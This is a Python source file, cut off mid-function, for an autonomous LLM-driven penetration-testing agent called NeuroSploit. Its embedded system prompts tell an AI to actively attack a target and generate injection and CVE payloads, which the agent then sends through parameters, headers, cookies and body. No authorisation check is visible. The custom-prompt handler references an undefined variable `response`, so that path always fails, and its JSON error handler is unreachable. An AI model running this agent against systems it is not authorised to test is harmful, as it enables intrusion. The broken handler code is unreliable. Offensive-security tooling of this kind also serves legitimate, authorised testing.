"""
NeuroSploit v3 - Autonomous AI Security Agent

REAL AI-powered penetration testing agent that:
1. Actually calls Claude/OpenAI API for intelligent analysis
2. Performs comprehensive reconnaissance
3. Tests vulnerabilities with proper verification (no false positives)
4. Generates detailed reports with CVSS, PoC, remediation
"""

import asyncio
import aiohttp
import json
import re
import os
import hashlib
from typing import Dict, List, Any, Optional, Callable, Tuple
from dataclasses import dataclass, field, asdict
from datetime import datetime
from urllib.parse import urljoin, urlparse, parse_qs, urlencode
from enum import Enum
from pathlib import Path

from backend.core.agent_memory import AgentMemory
from backend.core.vuln_engine.registry import VulnerabilityRegistry
from backend.core.vuln_engine.payload_generator import PayloadGenerator
from backend.core.response_verifier import ResponseVerifier
from backend.core.negative_control import NegativeControlEngine
from backend.core.proof_of_execution import ProofOfExecution
from backend.core.confidence_scorer import ConfidenceScorer
from backend.core.validation_judge import ValidationJudge
from backend.core.vuln_engine.system_prompts import get_system_prompt, get_prompt_for_vuln_type
from backend.core.vuln_engine.ai_prompts import get_verification_prompt, get_poc_prompt
from backend.core.access_control_learner import AccessControlLearner
from backend.core.request_engine import RequestEngine, ErrorType
from backend.core.waf_detector import WAFDetector
from backend.core.strategy_adapter import StrategyAdapter
from backend.core.chain_engine import ChainEngine
from backend.core.auth_manager import AuthManager
from backend.core.llm import UnifiedLLMClient, LLMConnectionError as UnifiedLLMConnectionError

try:
    from core.browser_validator import BrowserValidator, embed_screenshot, HAS_PLAYWRIGHT
except ImportError:
    HAS_PLAYWRIGHT = False
    BrowserValidator = None
    embed_screenshot = None

# Try to import ReconIntegration for enhanced recon
try:
    from backend.core.recon_integration import ReconIntegration, check_tools_installed
    HAS_RECON_INTEGRATION = True
except ImportError:
    HAS_RECON_INTEGRATION = False

# LLM provider imports are now handled by backend.core.llm.providers

# Security sandbox (Docker-based real tools)
try:
    from core.sandbox_manager import get_sandbox, SandboxManager
    HAS_SANDBOX = True
except ImportError:
    HAS_SANDBOX = False

# MCP tool client (in-process direct transport)
try:
    from core.mcp_client import MCPToolClient
    HAS_MCP_CLIENT = True
except ImportError:
    HAS_MCP_CLIENT = False


class OperationMode(Enum):
    """Agent operation modes"""
    RECON_ONLY = "recon_only"
    FULL_AUTO = "full_auto"
    PROMPT_ONLY = "prompt_only"
    ANALYZE_ONLY = "analyze_only"
    AUTO_PENTEST = "auto_pentest"


class FindingSeverity(Enum):
    CRITICAL = "critical"
    HIGH = "high"
    MEDIUM = "medium"
    LOW = "low"
    INFO = "info"


@dataclass
class CVSSScore:
    """CVSS 3.1 Score"""
    score: float
    severity: str
    vector: str


@dataclass
class Finding:
    """Vulnerability finding with full details"""
    id: str
    title: str
    severity: str
    vulnerability_type: str = ""
    cvss_score: float = 0.0
    cvss_vector: str = ""
    cwe_id: str = ""
    description: str = ""
    affected_endpoint: str = ""
    parameter: str = ""
    payload: str = ""
    evidence: str = ""
    request: str = ""
    response: str = ""
    impact: str = ""
    poc_code: str = ""
    remediation: str = ""
    references: List[str] = field(default_factory=list)
    screenshots: List[str] = field(default_factory=list)
    affected_urls: List[str] = field(default_factory=list)
    ai_verified: bool = False
    confidence: str = "0"         # Numeric string "0"-"100"
    confidence_score: int = 0     # Numeric confidence score 0-100
    confidence_breakdown: Dict = field(default_factory=dict)  # Scoring breakdown
    proof_of_execution: str = ""  # What proof was found
    negative_controls: str = ""   # Control test results
    ai_status: str = "confirmed"  # "confirmed" | "rejected" | "pending"
    rejection_reason: str = ""
    credential_label: str = ""
    auth_context: Dict = field(default_factory=dict)


@dataclass
class ReconData:
    """Reconnaissance data"""
    subdomains: List[str] = field(default_factory=list)
    live_hosts: List[str] = field(default_factory=list)
    endpoints: List[Dict] = field(default_factory=list)
    parameters: Dict[str, List[str]] = field(default_factory=dict)
    technologies: List[str] = field(default_factory=list)
    forms: List[Dict] = field(default_factory=list)
    js_files: List[str] = field(default_factory=list)
    api_endpoints: List[str] = field(default_factory=list)
    ports: List[str] = field(default_factory=list)
    dns_records: List[str] = field(default_factory=list)
    urls: List[str] = field(default_factory=list)
    interesting_paths: List[Dict] = field(default_factory=list)
    secrets: List[str] = field(default_factory=list)
    waf_info: Optional[Dict] = None
    recon_depth: str = "basic"


def _get_endpoint_url(ep) -> str:
    """Safely get URL from endpoint (handles both str and dict)"""
    if isinstance(ep, str):
        return ep
    elif isinstance(ep, dict):
        return ep.get("url", "")
    return ""


def _get_endpoint_method(ep) -> str:
    """Safely get method from endpoint"""
    if isinstance(ep, dict):
        return ep.get("method", "GET")
    return "GET"


# Legacy aliases — LLMClient is replaced by UnifiedLLMClient from backend.core.llm
# LLMConnectionError is now defined in backend.core.llm.client
LLMClient = UnifiedLLMClient  # Backward compat alias
LLMConnectionError = UnifiedLLMConnectionError  # Backward compat alias


DEFAULT_ASSESSMENT_PROMPT = """You are NeuroSploit, an elite autonomous penetration testing AI agent.
Your mission: identify real, exploitable vulnerabilities — zero false positives.

## METHODOLOGY (PTES/OWASP/WSTG aligned)

### Phase 1 — Reconnaissance & Fingerprinting
- Discover all endpoints, parameters, forms, API paths, WebSocket URLs
- Technology fingerprinting: language, framework, server, WAF, CDN
- Identify attack surface: file upload, auth endpoints, admin panels, GraphQL

### Phase 2 — Technology-Guided Prioritization
Select vulnerability types based on detected technology stack:
- PHP/Laravel → LFI, command injection, SSTI (Blade), SQLi, file upload
- Node.js/Express → NoSQL injection, SSRF, prototype pollution, SSTI (EJS/Pug)
- Python/Django/Flask → SSTI (Jinja2), command injection, IDOR, mass assignment
- Java/Spring → XXE, insecure deserialization, expression language injection, SSRF
- ASP.NET → path traversal, XXE, header injection, insecure deserialization
- API/REST → IDOR, BOLA, BFLA, JWT manipulation, mass assignment, rate limiting
- GraphQL → introspection, injection, DoS via nested queries
- WordPress → file upload, SQLi, XSS, exposed admin, plugin vulns

### Phase 3 — Active Testing (~119 vuln types available, including PATT-extended)
**OWASP Top 10 2021 coverage:**
- A01 Broken Access Control: IDOR, BOLA, BFLA, privilege escalation, forced browsing, CORS, account takeover
- A02 Cryptographic Failures: weak encryption/hashing, cleartext transmission, SSL issues
- A03 Injection: SQLi (error/union/blind/time), NoSQL, LDAP, XPath, command, SSTI, XSS, XXE, XSLT, SSI, LaTeX, prompt injection
- A04 Insecure Design: business logic, race condition, mass assignment, ReDoS, web cache deception
- A05 Security Misconfiguration: headers, debug mode, directory listing, default creds, reverse proxy misconfig, vhost enumeration
- A06 Vulnerable Components: outdated dependencies, insecure CDN, dependency confusion
- A07 Auth Failures: JWT, session fixation, brute force, 2FA bypass, OAuth misconfig, SAML injection
- A08 Data Integrity: insecure deserialization, cache poisoning, HTTP smuggling, GWT deserialization
- A09 Logging Failures: log injection, improper error handling
- A10 SSRF: standard SSRF, cloud metadata SSRF, DNS rebinding, headless browser abuse

### Phase 4 — Verification (multi-signal)
Every finding MUST have:
1. Concrete HTTP evidence (request + response)
2. At least 2 verification signals OR high-confidence tester match
3. No speculative language — only confirmed exploitable issues
4. Screenshot capture when possible

### Phase 5 — Reporting
- Each finding: title, severity, CVSS 3.1, CWE, PoC, impact, remediation
- Prioritized by real-world exploitability
- Executive summary with risk rating

## CRITICAL RULES
- NEVER report theoretical/speculative vulnerabilities
- ALWAYS verify with real HTTP evidence before confirming
- Test systematically: every parameter, every endpoint, every form
- Use technology hints to select the most relevant tests
- Capture baseline responses before testing for accurate diff-based detection
"""


class AutonomousAgent:
    """
    AI-Powered Autonomous Security Agent

    Performs real security testing with AI-powered analysis
    """

    # Legacy vuln type → registry key mapping
    VULN_TYPE_MAP = {
        # Aliases → canonical registry keys
        "sqli": "sqli_error",
        "xss": "xss_reflected",
        "rce": "command_injection",
        "cors": "cors_misconfig",
        "lfi_rfi": "lfi",
        "file_inclusion": "lfi",
        "remote_code_execution": "command_injection",
        "broken_auth": "auth_bypass",
        "broken_access": "bola",
        "api_abuse": "rest_api_versioning",
        # Identity mappings — Injection (18)
        "sqli_error": "sqli_error", "sqli_union": "sqli_union",
        "sqli_blind": "sqli_blind", "sqli_time": "sqli_time",
        "command_injection": "command_injection", "ssti": "ssti",
        "nosql_injection": "nosql_injection", "ldap_injection": "ldap_injection",
        "xpath_injection": "xpath_injection", "graphql_injection": "graphql_injection",
        "crlf_injection": "crlf_injection", "header_injection": "header_injection",
        "email_injection": "email_injection",
        "expression_language_injection": "expression_language_injection",
        "log_injection": "log_injection", "html_injection": "html_injection",
        "csv_injection": "csv_injection", "orm_injection": "orm_injection",
        # XSS (5)
        "xss_reflected": "xss_reflected", "xss_stored": "xss_stored",
        "xss_dom": "xss_dom", "blind_xss": "blind_xss",
        "mutation_xss": "mutation_xss",
        # File Access (8)
        "lfi": "lfi", "rfi": "rfi", "path_traversal": "path_traversal",
        "xxe": "xxe", "file_upload": "file_upload",
        "arbitrary_file_read": "arbitrary_file_read",
        "arbitrary_file_delete": "arbitrary_file_delete", "zip_slip": "zip_slip",
        # Request Forgery (4)
        "ssrf": "ssrf", "ssrf_cloud": "ssrf_cloud",
        "csrf": "csrf", "cors_misconfig": "cors_misconfig",
        # Auth (8)
        "auth_bypass": "auth_bypass", "jwt_manipulation": "jwt_manipulation",
        "session_fixation": "session_fixation", "weak_password": "weak_password",
        "default_credentials": "default_credentials", "brute_force": "brute_force",
        "two_factor_bypass": "two_factor_bypass",
        "oauth_misconfiguration": "oauth_misconfiguration",
        # Authorization (6)
        "idor": "idor", "bola": "bola", "bfla": "bfla",
        "privilege_escalation": "privilege_escalation",
        "mass_assignment": "mass_assignment", "forced_browsing": "forced_browsing",
        # Client-Side (8)
        "clickjacking": "clickjacking", "open_redirect": "open_redirect",
        "dom_clobbering": "dom_clobbering",
        "postmessage_vulnerability": "postmessage_vulnerability",
        "websocket_hijacking": "websocket_hijacking",
        "prototype_pollution": "prototype_pollution",
        "css_injection": "css_injection", "tabnabbing": "tabnabbing",
        # Infrastructure (10)
        "security_headers": "security_headers", "ssl_issues": "ssl_issues",
        "http_methods": "http_methods", "directory_listing": "directory_listing",
        "debug_mode": "debug_mode", "exposed_admin_panel": "exposed_admin_panel",
        "exposed_api_docs": "exposed_api_docs",
        "insecure_cookie_flags": "insecure_cookie_flags",
        "http_smuggling": "http_smuggling", "cache_poisoning": "cache_poisoning",
        # Logic & Data (16)
        "race_condition": "race_condition", "business_logic": "business_logic",
        "rate_limit_bypass": "rate_limit_bypass",
        "parameter_pollution": "parameter_pollution",
        "type_juggling": "type_juggling",
        "insecure_deserialization": "insecure_deserialization",
        "subdomain_takeover": "subdomain_takeover",
        "host_header_injection": "host_header_injection",
        "timing_attack": "timing_attack",
        "improper_error_handling": "improper_error_handling",
        "sensitive_data_exposure": "sensitive_data_exposure",
        "information_disclosure": "information_disclosure",
        "api_key_exposure": "api_key_exposure",
        "source_code_disclosure": "source_code_disclosure",
        "backup_file_exposure": "backup_file_exposure",
        "version_disclosure": "version_disclosure",
        # Crypto & Supply (8)
        "weak_encryption": "weak_encryption", "weak_hashing": "weak_hashing",
        "weak_random": "weak_random", "cleartext_transmission": "cleartext_transmission",
        "vulnerable_dependency": "vulnerable_dependency",
        "outdated_component": "outdated_component",
        "insecure_cdn": "insecure_cdn", "container_escape": "container_escape",
        # Cloud & API (9)
        "s3_bucket_misconfiguration": "s3_bucket_misconfiguration",
        "cloud_metadata_exposure": "cloud_metadata_exposure",
        "serverless_misconfiguration": "serverless_misconfiguration",
        "graphql_introspection": "graphql_introspection",
        "graphql_dos": "graphql_dos", "rest_api_versioning": "rest_api_versioning",
        "soap_injection": "soap_injection", "api_rate_limiting": "api_rate_limiting",
        "excessive_data_exposure": "excessive_data_exposure",
        # PATT-extended types (19 new)
        "account_takeover": "account_takeover", "ato": "account_takeover",
        "client_side_path_traversal": "client_side_path_traversal",
        "denial_of_service": "denial_of_service", "dos": "denial_of_service",
        "dependency_confusion": "dependency_confusion", "dep_confusion": "dependency_confusion",
        "dns_rebinding": "dns_rebinding",
        "external_variable_modification": "external_variable_modification",
        "gwt_deserialization": "gwt_deserialization", "gwt": "gwt_deserialization",
        "headless_browser_abuse": "headless_browser_abuse",
        "java_rmi": "java_rmi", "rmi": "java_rmi",
        "latex_injection": "latex_injection", "latex": "latex_injection",
        "prompt_injection": "prompt_injection", "prompt_inj": "prompt_injection",
        "redos": "redos", "regex_dos": "redos",
        "reverse_proxy_misconfig": "reverse_proxy_misconfig",
        "saml_injection": "saml_injection", "saml": "saml_injection",
        "ssi_injection": "ssi_injection", "ssi": "ssi_injection",
        "vhost_enumeration": "vhost_enumeration", "vhost": "vhost_enumeration",
        "web_cache_deception": "web_cache_deception", "wcd": "web_cache_deception",
        "xs_leak": "xs_leak", "xsleak": "xs_leak",
        "xslt_injection": "xslt_injection", "xslt": "xslt_injection",
    }

    def __init__(
        self,
        target: str,
        mode: OperationMode = OperationMode.FULL_AUTO,
        log_callback: Optional[Callable] = None,
        progress_callback: Optional[Callable] = None,
        auth_headers: Optional[Dict] = None,
        task: Optional[Any] = None,
        custom_prompt: Optional[str] = None,
        recon_context: Optional[Dict] = None,
        finding_callback: Optional[Callable] = None,
        lab_context: Optional[Dict] = None,
        scan_id: Optional[str] = None,
        recon_depth: Optional[str] = None,
        governance: Optional[Any] = None,
        preset_recon: Optional['ReconData'] = None,
        focus_vuln_types: Optional[List[str]] = None,
        agent_label: Optional[str] = None,
        credential_sets: Optional[List[Dict]] = None,
    ):
        self.target = self._normalize_target(target)
        self.mode = mode
        self.log = log_callback or self._default_log
        self.progress_callback = progress_callback
        self.finding_callback = finding_callback
        self.auth_headers = auth_headers or {}
        self.task = task
        self.recon_depth = recon_depth or "medium"
        self.custom_prompt = custom_prompt
        self.recon_context = recon_context
        self.lab_context = lab_context or {}
        self.scan_id = scan_id
        self.governance = governance
        self.browser_validation_enabled = os.getenv('ENABLE_BROWSER_VALIDATION', 'false').lower() == 'true'
        self.knowledge_augmentation_enabled = os.getenv('ENABLE_KNOWLEDGE_AUGMENTATION', 'false').lower() == 'true'
        self.persistent_memory_enabled = os.getenv('ENABLE_PERSISTENT_MEMORY', 'true').lower() == 'true'
        self.waf_evasion_enabled = os.getenv('ENABLE_WAF_EVASION', 'true').lower() == 'true'
        self.waf_confidence_threshold = float(os.getenv('WAF_CONFIDENCE_THRESHOLD', '0.7'))
        self._cancelled = False
        self._paused = False
        self._skip_to_phase: Optional[str] = None  # Phase skip target

        self.session: Optional[aiohttp.ClientSession] = None
        self.llm = self._init_unified_llm()

        # VulnEngine integration (100 types, 428 payloads, 100 testers)
        self.vuln_registry = VulnerabilityRegistry()
        self.payload_generator = PayloadGenerator()
        self.response_verifier = ResponseVerifier()
        self.knowledge_base = self._load_knowledge_base()

        # PoC generator for confirmed findings
        from backend.core.poc_generator import PoCGenerator
        self.poc_generator = PoCGenerator()

        # Validation pipeline: negative controls + proof of execution + confidence scoring
        self.negative_controls = NegativeControlEngine()
        self.proof_engine = ProofOfExecution()
        self.confidence_scorer = ConfidenceScorer()
        self.validation_judge = ValidationJudge(
            self.negative_controls, self.proof_engine,
            self.confidence_scorer, self.llm,
            access_control_learner=getattr(self, 'access_control_learner', None)
        )

        # Execution history for cross-scan learning
        try:
            from backend.core.execution_history import ExecutionHistory
            self.execution_history = ExecutionHistory()
        except Exception:
            self.execution_history = None

        # Access control learning engine (adapts from BOLA/BFLA/IDOR outcomes)
        try:
            self.access_control_learner = AccessControlLearner()
        except Exception:
            self.access_control_learner = None

        # Autonomy modules (lazy-init after session in __aenter__)
        self.request_engine = None
        self.waf_detector = None
        self.strategy = None
        self.chain_engine = ChainEngine(llm=self.llm, governance=self.governance)
        self.auth_manager = None
        self._waf_result = None

        # Data storage
        self.recon = ReconData()
        self.preset_recon = preset_recon
        self.focus_vuln_types = focus_vuln_types
        self.agent_label = agent_label or ""
        self.credential_sets = credential_sets
        self._diff_engine = None  # Lazy-init in __aenter__ when credential_sets present
        if preset_recon:
            self.recon = preset_recon
        self.memory = AgentMemory()
        self.custom_prompts: List[str] = []
        self.tool_executions: List[Dict] = []
        self.rejected_findings: List[Finding] = []
        self._sandbox = None  # Lazy-init sandbox reference for tool runner

        # Persistent cross-session memory
        self.persistent_mem = None
        if self.persistent_memory_enabled:
            try:
                from backend.core.persistent_memory import PersistentMemory
                from backend.db.database import async_session_maker
                self.persistent_mem = PersistentMemory(async_session_maker)
            except Exception:
                pass

        # Observability tracer
        self.tracer = None
        if os.getenv('ENABLE_TRACING', 'false').lower() == 'true' and scan_id:
            try:
                from backend.core.tracer import ScanTracer
                from backend.db.database import async_session_maker as _tracer_asm
                self.tracer = ScanTracer(scan_id, _tracer_asm)
            except Exception:
                pass

        # MCP tool client (direct in-process transport)
        self.mcp_client = None
        if HAS_MCP_CLIENT:
            try:
                config = self._load_config()
                self.mcp_client = MCPToolClient(config)
            except Exception:
                pass

    @property
    def findings(self) -> List[Finding]:
        """Backward-compatible access to confirmed findings via memory"""
        return self.memory.confirmed_findings

    def cancel(self):
        """Cancel the agent execution"""
        self._cancelled = True
        self._paused = False  # Unpause so cancel is immediate

    def is_cancelled(self) -> bool:
        """Check if agent was cancelled"""
        return self._cancelled

    def pause(self):
        """Pause the agent execution"""
        self._paused = True

    def resume(self):
        """Resume the agent execution"""
        self._paused = False

    def is_paused(self) -> bool:
        """Check if agent is paused"""
        return self._paused

    async def _wait_if_paused(self):
        """Block while paused, checking for cancel every second"""
        while self._paused and not self._cancelled:
            await asyncio.sleep(1)

    # Phase ordering for skip-to-phase support
    AGENT_PHASES = ["recon", "analysis", "testing", "enhancement", "completed"]

    def skip_to_phase(self, target_phase: str) -> bool:
        """Signal the agent to skip to a given phase"""
        if target_phase not in self.AGENT_PHASES:
            return False
        self._skip_to_phase = target_phase
        return True

    def _check_skip(self, current_phase: str) -> Optional[str]:
        """Check if we should skip to a phase ahead of current_phase"""
        target = self._skip_to_phase
        if not target:
            return None
        try:
            cur_idx = self.AGENT_PHASES.index(current_phase)
            tgt_idx = self.AGENT_PHASES.index(target)
        except ValueError:
            return None
        if tgt_idx > cur_idx:
            self._skip_to_phase = None
            return target
        self._skip_to_phase = None
        return None

    def _map_vuln_type(self, vuln_type: str) -> str:
        """Map agent vuln type name to VulnEngine registry key"""
        return self.VULN_TYPE_MAP.get(vuln_type, vuln_type)

    def _get_payloads(self, vuln_type: str) -> List[str]:
        """Get payloads from VulnEngine PayloadGenerator"""
        mapped = self._map_vuln_type(vuln_type)
        payloads = self.payload_generator.payload_libraries.get(mapped, [])
        if not payloads:
            # Try original name
            payloads = self.payload_generator.payload_libraries.get(vuln_type, [])
        return payloads

    @staticmethod
    def _load_knowledge_base() -> Dict:
        """Load vulnerability knowledge base JSON at startup"""
        kb_path = Path(__file__).parent.parent.parent / "data" / "vuln_knowledge_base.json"
        try:
            with open(kb_path, "r") as f:
                return json.load(f)
        except Exception:
            return {}

    @staticmethod
    def _load_config() -> Dict:
        """Load config/config.json for MCP and sandbox settings."""
        config_path = Path(__file__).parent.parent.parent / "config" / "config.json"
        try:
            with open(config_path) as f:
                return json.load(f)
        except Exception:
            return {}

    @staticmethod
    def _init_unified_llm() -> 'UnifiedLLMClient':
        """Initialize the UnifiedLLMClient with config-driven 3-tier routing."""
        config = AutonomousAgent._load_config()
        return UnifiedLLMClient(config)

    async def add_custom_prompt(self, prompt: str):
        """Add a custom prompt to be processed"""
        self.custom_prompts.append(prompt)
        await self.log_llm("info", f"[USER PROMPT RECEIVED] {prompt}")
        # Process immediately if LLM is available
        if self.llm.is_available():
            await self._process_custom_prompt(prompt)

    async def _process_custom_prompt(self, prompt: str):
        """Process a custom user prompt with the LLM and execute requested tests.

        Detects CVE references and vulnerability test requests, then ACTUALLY tests
        them against the target instead of just providing AI text responses.
        """
        await self.log_llm("info", f"[AI] Processing user prompt: {prompt}")

        # Detect CVE references in prompt
        cve_match = re.search(r'CVE-\d{4}-\d{4,}', prompt, re.IGNORECASE)
        cve_id = cve_match.group(0).upper() if cve_match else None

        # Build context about available endpoints
        endpoints_info = []
        for ep in self.recon.endpoints[:20]:
            endpoints_info.append(f"- {_get_endpoint_method(ep)} {_get_endpoint_url(ep)}")

        params_info = []
        for param, values in list(self.recon.parameters.items())[:15]:
            params_info.append(f"- {param}: {values[:3]}")

        forms_info = []
        for form in self.recon.forms[:10]:
            forms_info.append(f"- {form.get('method', 'GET')} {form.get('action', 'N/A')} fields={form.get('inputs', [])[:5]}")

        # Enhanced system prompt that requests actionable test plans
        system_prompt = f"""You are a senior penetration tester performing ACTIVE TESTING against {self.target}.
The user wants you to ACTUALLY TEST for vulnerabilities, not just explain them.
{'The user is asking about ' + cve_id + '. Research this CVE and generate specific test payloads.' if cve_id else ''}

Current reconnaissance data:
Target: {self.target}
Endpoints ({len(self.recon.endpoints)} total):
{chr(10).join(endpoints_info[:10]) if endpoints_info else '  None discovered yet'}

Parameters ({len(self.recon.parameters)} total):
{chr(10).join(params_info[:10]) if params_info else '  None discovered yet'}

Forms ({len(self.recon.forms)} total):
{chr(10).join(forms_info[:5]) if forms_info else '  None discovered yet'}

Technologies detected: {', '.join(self.recon.technologies) if self.recon.technologies else 'None'}

CRITICAL: You must respond with a TEST PLAN in JSON format. The agent will EXECUTE these tests.
Available injection points: "parameter", "header", "cookie", "body", "path"
Available vuln types: xss_reflected, xss_stored, sqli_error, sqli_union, sqli_blind, sqli_time,
  command_injection, ssti, lfi, rfi, path_traversal, ssrf, xxe, crlf_injection, header_injection,
  host_header_injection, open_redirect, csrf, nosql_injection, idor, cors_misconfig

Respond in this JSON format:
{{
  "analysis": "What the user is asking and your security assessment",
  "action": "test_cve|test_endpoint|test_parameter|scan_for|analyze|info",
  "vuln_type": "primary vulnerability type to test",
  "injection_point": "parameter|header|cookie|body|path",
  "header_name": "X-Forwarded-For",
  "payloads": ["payload1", "payload2", "payload3"],
  "targets": ["specific URLs to test"],
  "vuln_types": ["list of vuln types if scanning for multiple"],
  "response": "Brief explanation shown to the user"
}}

For CVE testing, include at least 5 specific payloads based on the CVE's attack vector.
Always set action to "test_cve" or "test_endpoint" when the user asks to test something."""

        # Append anti-hallucination directives
        system_prompt += "\n\n" + get_system_prompt("testing")

        try:
            action_data = await self.llm.generate_json(prompt, system=system_prompt, task_type="custom_prompt")
            if not action_data:
                await self.log_llm("warning", "[AI] No response from LLM")
                return

            await self.log_llm("info", f"[AI] Analyzing request and building test plan...")

            import json
            try:
                if action_data:
                    action = action_data.get("action", "info")
                    targets = action_data.get("targets", [])
                    vuln_types = action_data.get("vuln_types", [])
                    vuln_type = action_data.get("vuln_type", "")
                    injection_point = action_data.get("injection_point", "parameter")
                    header_name = action_data.get("header_name", "")
                    payloads = action_data.get("payloads", [])
                    ai_response = action_data.get("response", response)

                    await self.log_llm("info", f"[AI] {ai_response[:300]}")

                    # ── CVE Testing: Actually execute tests ──
                    if action == "test_cve":
                        await self.log_llm("info", f"[AI] Executing CVE test plan: {vuln_type} via {injection_point}")
                        await self._execute_cve_test(
                            cve_id or "CVE-unknown",
                            vuln_type, injection_point, header_name,
                            payloads, targets
                        )

                    elif action == "test_endpoint" and targets:
                        await self.log_llm("info", f"[AI] Testing {len(targets)} endpoints...")
                        for target_url in targets[:5]:
                            if payloads and vuln_type:
                                # Use AI-generated payloads with correct injection
                                await self._execute_targeted_test(
                                    target_url, vuln_type, injection_point,
                                    header_name, payloads
                                )
                            else:
                                await self._test_custom_endpoint(target_url, vuln_types or ["xss_reflected", "sqli_error"])

                    elif action == "test_parameter" and targets:
                        await self.log_llm("info", f"[AI] Testing parameters: {targets}")
                        await self._test_custom_parameters(targets, vuln_types or ["xss_reflected", "sqli_error"])

                    elif action == "scan_for" and vuln_types:
                        await self.log_llm("info", f"[AI] Scanning for: {vuln_types}")
                        for vtype in vuln_types[:5]:
                            await self._scan_for_vuln_type(vtype)

                    elif action == "analyze":
                        await self.log_llm("info", f"[AI] Analysis complete")

                    else:
                        await self.log_llm("info", f"[AI] Response provided - no active test needed")
                else:
                    await self.log_llm("info", f"[AI RESPONSE] {response[:1000]}")

            except json.JSONDecodeError:
                await self.log_llm("info", f"[AI RESPONSE] {response[:1000]}")

        except Exception as e:
            await self.log_llm("error", f"[AI] Error processing prompt: {str(e)}")

    async def _test_custom_endpoint(self, url: str, vuln_types: List[str]):
        """Test a specific endpoint for vulnerabilities"""
        if not self.session:
            return

        await self.log("info", f"  Testing endpoint: {url}")

        try:
            # Parse URL to find parameters
            parsed = urlparse(url)
            params = parse_qs(parsed.query)

            if not params:
                # Try adding common parameters
                params = {"id": ["1"], "q": ["test"]}

            for param_name in list(params.keys())[:3]:
                for vtype in vuln_types[:2]:
                    payloads = self._get_payloads(vtype)[:2]
                    for payload in payloads:
                        await self._test_single_param(url, param_name, payload, vtype)

        except Exception as e:
            await self.log("debug", f"  Error testing {url}: {e}")

    async def _test_custom_parameters(self, param_names: List[str], vuln_types: List[str]):
        """Test specific parameters across known endpoints"""
        endpoints_with_params = [
            ep for ep in self.recon.endpoints
            if any(p in str(ep) for p in param_names)
        ]

        if not endpoints_with_params:
            # Use all endpoints that have parameters
            endpoints_with_params = self.recon.endpoints[:10]

        for ep in endpoints_with_params[:5]:
            url = _get_endpoint_url(ep)
            for param in param_names[:3]:
                for vtype in vuln_types[:2]:
                    payloads = self._get_payloads(vtype)[:2]
                    for payload in payloads:
                        await self._test_single_param(url, param, payload, vtype)

    async def _execute_cve_test(self, cve_id: str, vuln_type: str,
                                injection_point: str, header_name: str,
                                payloads: List[str], targets: List[str]):
        """Execute actual CVE testing with AI-generated payloads against the target."""
        await self.log("warning", f"  [CVE TEST] Testing {cve_id} ({vuln_type}) via {injection_point}")

        # Build test targets: use AI-suggested URLs or fall back to discovered endpoints
        test_urls = targets[:5] if targets else []
        if not test_urls:
            test_urls = [self.target]
            for ep in self.recon.endpoints[:10]:
                ep_url = _get_endpoint_url(ep)
                if ep_url and ep_url not in test_urls:
                    test_urls.append(ep_url)

        # Also use payloads from the PayloadGenerator as fallback
        all_payloads = list(payloads[:10])
        registry_payloads = self._get_payloads(vuln_type)[:5]
        for rp in registry_payloads:
            if rp not in all_payloads:
                all_payloads.append(rp)

        findings_count = 0
        for test_url in test_urls[:5]:
            if self.is_cancelled():
                return
            await self.log("info", f"  [CVE TEST] Testing {test_url[:60]}...")

            for payload in all_payloads[:10]:
                if self.is_cancelled():
                    return

                # Use correct injection method
                if injection_point == "header":
                    test_resp = await self._make_request_with_injection(
                        test_url, "GET", payload,
                        injection_point="header",
                        header_name=header_name or "X-Forwarded-For"
                    )
                    param_name = header_name or "X-Forwarded-For"
                elif injection_point in ("body", "cookie", "path"):
                    parsed = urlparse(test_url)
                    params = list(parse_qs(parsed.query).keys()) if parsed.query else ["data"]
                    test_resp = await self._make_request_with_injection(
                        test_url, "POST" if injection_point == "body" else "GET",
                        payload, injection_point=injection_point,
                        param_name=params[0] if params else "data"
                    )
                    param_name = params[0] if params else "data"
                else:  # parameter
                    parsed = urlparse(test_url)
                    params = list(parse_qs(parsed.query).keys()) if parsed.query else ["id", "q"]
                    param_name = params[0] if params else "id"
                    test_resp = await self._make_request_with_injection(
                        test_url, "GET", payload,
                        injection_point="parameter",
                        param_name=param_name
                    )

                if not test_resp:
                    continue

                # Verify the response
                is_vuln, evidence = await self._verify_vulnerability(
                    vuln_type, payload, test_resp, None
                )

                if is_vuln:
                    evidence = f"[{cve_id}] {evidence}"
                    finding = self._create_finding(
                        vuln_type, test_url, param_name, payload,
                        evidence, test_resp, ai_confirmed=True
                    )
                    finding.title = f"{cve_id} - {finding.title}"
                    finding.references.append(f"https://nvd.nist.gov/vuln/detail/{cve_id}")
                    await self._add_finding(finding)
                    findings_count += 1
                    await self.log("warning", f"  [CVE TEST] {cve_id} CONFIRMED at {test_url[:50]}")
                    break  # One finding per URL is enough

        if findings_count == 0:
            await self.log("info", f"  [CVE TEST] {cve_id} not confirmed after testing {len(test_urls)} targets with {len(all_payloads)} payloads")
        else:
            await self.log("warning", f"  [CVE TEST] {cve_id} found {findings_count} vulnerable endpoint(s)")

    async def _execute_targeted_test(self, url: str, vuln_type: str,
                                      injection_point: str, header_name: str,
                                      payloads: List[str]):
        """Execute targeted vulnerability tests with specific payloads and injection point."""
        await self.log("info", f"  [TARGETED] Testing {vuln_type} via {injection_point} at {url[:60]}")

        for payload in payloads[:10]:
            if self.is_cancelled():
                return

            parsed = urlparse(url)
            params = list(parse_qs(parsed.query).keys()) if parsed.query else ["id"]
            param_name = params[0] if params else "id"

            if injection_point == "header":
                param_name = header_name or "X-Forwarded-For"

            test_resp = await self._make_request_with_injection(
                url, "GET", payload,
                injection_point=injection_point,
                param_name=param_name,
                header_name=header_name
            )

            if not test_resp:
                continue

            is_vuln, evidence = await self._verify_vulnerability(
                vuln_type, payload, test_resp, None
            )

            if is_vuln:
                finding = self._create_finding(
                    vuln_type, url, param_name, payload,
                    evidence, test_resp, ai_confirmed=True
                )
                await self._add_finding(finding)
                await self.log("warning", f"  [TARGETED] {vuln_type} confirmed at {url[:50]}")
                return

        await self.log("info", f"  [TARGETED] {vuln_type} not confirmed at {url[:50]}")

    async def _scan_for_vuln_type(self, vuln_type: str):
        """Scan all endpoints for a specific vulnerability type"""
        await self.log("info", f"  Scanning for {vuln_type.upper()} vulnerabilities...")

        vuln_lower = vuln_type.lower()

        # Handle header-based vulnerabilities (no payloads needed)
        if vuln_lower in ["clickjacking", "x-frame-options", "csp", "hsts", "headers", "security headers", "missing headers"]:
            await self._test_security_headers(vuln_lower)
            return

        # Handle CORS testing
        if vuln_lower in ["cors", "cross-origin"]:
            await self._test_cors()
            return

        # Handle information disclosure
        if vuln_lower in ["info", "information disclosure", "version", "technology"]:
            await self._test_information_disclosure()
            return

        # Standard payload-based testing
        payloads = self._get_payloads(vuln_type)[:3]
        if not payloads:
